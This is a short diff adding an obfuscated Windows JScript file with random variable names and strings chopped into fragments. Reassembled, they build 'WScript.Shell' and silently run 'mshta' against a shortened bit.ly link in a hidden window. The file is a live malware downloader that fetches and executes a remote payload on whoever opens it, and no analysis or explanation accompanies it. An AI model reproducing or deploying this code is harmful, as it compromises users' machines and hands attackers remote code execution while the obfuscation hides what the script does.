@@ -1,0 +1,10 @@
+qcobktuz = ("t.S")
+cgcgxviv = ("p"+qcobktuz+"h")
+tsxxlwwr = ("i"+cgcgxviv+"el")
+bemqnndr = ("Scr")
+var gralvrvd = WScript.CreateObject("W"+bemqnndr+tsxxlwwr+"l")
+xwslntqo = ("m")
+ykautuja = ("sh")
+tjfgsmit = ("ta ")
+gralvrvd.Run((xwslntqo+ykautuja+tjfgsmit)+" https://bit.ly/3dbgUYM",0)
+gralvrvd = null;
